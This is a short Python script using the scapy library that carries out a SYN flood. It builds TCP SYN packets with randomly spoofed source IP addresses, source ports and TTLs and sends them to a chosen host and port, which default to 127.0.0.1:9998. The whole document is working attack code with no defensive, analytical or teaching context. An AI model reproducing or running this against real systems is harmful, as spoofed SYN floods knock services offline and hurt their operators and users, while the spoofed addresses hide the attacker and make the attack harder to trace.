#-*- coding: UTF-8 -*-
import socket
import struct
from scapy.all import *
from scapy import all
import random
print"SYN FLOOD"

def attacker(host="127.0.0.1", port=9998):
    for i in range(100):
    	iprandom=random.randint(0,4000000000)
    	sip=socket.inet_ntoa(struct.pack('I',socket.htonl(iprandom)))
    	sp=random.randint(1,65535)
    	t=random.randint(64,128)
    	pack=(IP(src=sip,dst=host,ttl=t)/TCP(sport=sp,dport=port,flags=2))
    	send(pack)

if __name__ == "__main__":
    attacker()
